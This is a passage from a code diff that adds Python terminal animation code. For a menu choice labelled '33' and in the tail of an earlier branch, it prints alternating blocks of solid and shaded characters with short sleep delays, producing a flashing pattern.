+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+
+
+        elif choice == '33':
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          █████████████████
+          
+          """)
+          time.sleep(0.01)
+          print("""
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          ░░░░░░░░░░░░░░░░░
+          
+          
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+          """)
+          time.sleep(0.1)
+          print("""
+          █ █ █ █ █ █
+           █ █ █ █ █ █  
+          █ █ █ █ █ █
+           █ █ █ █ █ █ 
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          █ █ █ █ █ █
+           █ █ █ █ █ █
+          """)
+          time.sleep(0.1)
+          print("""
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
+           ░ ░ ░ ░ ░ ░
+          ░ ░ ░ ░ ░ ░
